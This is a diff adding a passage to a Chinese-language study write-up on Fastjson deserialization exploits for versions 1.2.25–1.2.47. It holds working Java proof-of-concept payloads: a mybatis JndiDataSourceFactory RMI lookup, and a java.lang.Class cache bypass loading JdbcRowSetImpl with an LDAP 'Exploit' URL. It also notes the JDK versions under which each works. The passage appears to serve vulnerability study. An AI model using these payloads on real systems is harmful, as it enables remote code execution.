@@ -177,5 +177,80 @@ public class POC {
 
 这也就是这个版本的修复与绕过
 
+## 1.2.25~.12.45
 
+这个就不做复现了，因为这个是利用了一个黑名单中没有的类进行攻击的，所以大概描述下，正常进行反序列化走流程就可以触发。
 
+这里需要安装额外的库 mybatis
+mybatis也是比较常用的库了 orm框架
+
+```
+<dependency>
+    <groupId>org.mybatis</groupId>
+    <artifactId>mybatis</artifactId>
+    <version>3.5.5</version>
+</dependency>
+```
+
+POC
+
+```
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+public class POC {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String st = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://vps:port/TouchFile\"}}";
+        JSON.parse(st);
+    }
+}
+
+```
+
+关于这个包中利用到的类和方法
+
+![image-20221008153613186](img/image-20221008153613186.png)
+
+看到这边`JndiDataSourceFactory`类中，这里的`setProperties`方法中调用了`InitialContext.lookup()
+
+其中参数是POC中输入的`properties`属性值自定义为`data_source`然后就可以进行利用并出发漏洞了。
+
+## 1.2.25~1.2.47
+
+这里有点不一样，所以再写一次
+
+- 1.2.25-1.2.32版本：未开启`AutoTypeSupport`时能成功利用，开启AutoTypeSupport反而不能成功触发；
+
+- 1.2.33-1.2.47版本：无论是否开启`AutoTypeSupport`，都能成功利用；
+
+还有就是jdk版本的限制和相应版本调用的是RMI还是JNDI的限制了
+
+基于RMI利用的JDK版本<=6u141、7u131、8u121，基于LDAP利用的JDK版本<=6u211、7u201、8u191
+
+然后先尝试利用一下
+
+```java
+package JDBC;
+
+import com.alibaba.fastjson.JSON;
+//import com.alibaba.fastjson.parser.ParserConfig;
+
+public class POC {
+    public static void main(String[] argv){
+        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String payload  = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
+                + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
+                + "\"dataSourceName\":\"ldap://localhost:1099/#Exploit\",\"autoCommit\":true}}";
+        JSON.parse(payload);
+    }
+}
+```
+
+这里我使用的是ldap而不是rmi，因为我的jdk版本是8u172，使用rmi协议是无法利用成功的。
+
+![image-20221008172128406](img/image-20221008172128406.png)
+
+下面开始分析，看下POC是通过`java.lang.Class`，将`JdbcRowSetImpl`类加载到`Map`中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，`checkAutoType()`就会抛出异常终止程序。
+
+下断点进行调试，在
